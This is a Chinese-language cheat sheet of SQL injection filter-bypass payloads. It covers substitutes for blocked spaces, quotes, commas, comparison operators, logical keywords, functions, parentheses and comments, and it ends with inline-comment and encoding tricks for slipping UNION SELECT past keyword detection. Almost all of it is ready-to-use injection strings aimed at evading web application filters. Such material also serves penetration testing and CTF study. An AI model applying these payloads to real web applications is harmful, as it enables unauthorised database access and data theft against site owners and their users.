### 1. 空格被过滤

| 符号 | 替换内容               |
| ---- | ---------------------- |
| 空格 | %20  (标准空格)        |
| 空格 | %09  (tab键，水平)     |
| 空格 | **%0a  (换行符)**      |
| 空格 | %a0  (不间断空格)      |
| 空格 | **%0b  (tab键，垂直)** |
| 空格 | %0c  (新的一页)        |
| 空格 | %0d(回车符)            |
| 空格 | %00(NULL字符)          |

### 2. 单引号被过滤

#### (1)进制转换

* 将字符转换为16进制，不使用单引号

```
	select * from users where username='Dumb'
=>	select * from users where username=0x44756d62
```

#### (2). 编码绕过

##### a. 一次编码

```
'  =>  %27
```

##### b. 二次编码

* 代码中须有**addslashes()**和**urldecode()或rawurldecode()**

```
'  =>  %2527
```

### 3. 逗号被过滤

```
1. from for
	select substr(database(),1,1);
	=> select substr(database() from 1 for 1);
2. join
	select 1,2,3
	=> select * from (select 1)a join (select 2)b join (select 3)c
3. offset
	select * from users limit 0,1;
	=> select * from users limit 1 offset 0;
```

### 4. 逻辑判断符被过滤

```
1. 等于号(=)绕过
	①1' or 1=1  =>  1' or 1<>1
	②1' or 1=1  =>  1' or 1 like 1a
2. 单个比较符的绕过
	①sqlmap可以使用between脚本，用greatest()返回给定表达式中最大值，least()返回给定表达式中最小值
		select * from users where id=1 and ascii(substr(user(),1,1))>100
		=> select * from users where id=1 and greatest(ascii(substr(user(),1,1)),100)=100
	②使用字符编码
		a. 实体编码   < => &lt;   > =>  &gt;
		b. ASCII码	< => %3C	> =>  %3E 
		c. Unicode编码	< => \u003C   > =>  \u003E
	③使用替代函数
		<  => CHAR(60)   >  =>  CHAR(62)
```

### 5. or and xor not绕过

```
1. 使用逻辑判断符替代
	and  =>  &&
    or   =>  ||
    xor  =>  |
    not  =>  !
2. 使用内联注释
	/*!and*/、/*!%23/*%0aand*/
```

### 6. 函数过滤

```
1. sleep()	=> benchmark(10000000,md5(1))

2. ascii()  =>  ord()

3. hex()、bin()  =>  ascii()

4.  group_concat()	=>  concat_ws()
		例如：select group_concat(1,' -- ',1,' -- ',1)  => select concat_ws(' -- ',1,1,1)
		
5. substr()  =>  mid()、substring()、left()、right()

6. user()  =>  @@user

7. datadir()  =>  @@datadir
```

### 7. 括号被过滤

```
1. %28、%29  =>  ()
```

### 8. 注释被过滤

```
1.  --   =>   #

2.  -- 、#   =>  '
	例：-1' union select 1,2,3 #  =>  -1' union select 1,2,3 ||'
```

### 9. 常见绕过方式

```
1. 绕过关键字检测
    a. 普通注释符：user() --> user/*//--//*/()  或  user/*%!a*/()
    b. 内联注释符：from  -->  /*!%23/*%0aform*/
    c. 大小写替换
    d. 重复关键字
    e. 编码绕过
    	URL编码： or 1=1  =>  %6f%72%20%31%3d%31
    	ASCII编码：		 
    	HEX编码：	敏感字符或关键字使用16进制替代，例：~  =>  0x7e
    	unicode编码：
2. 绕过2个及以上检测语句
union select  --> union/*//--//*/select
union select 1,2,3 -->   union /*!--+/*%0aselect/*!1,2,*/ 3
```
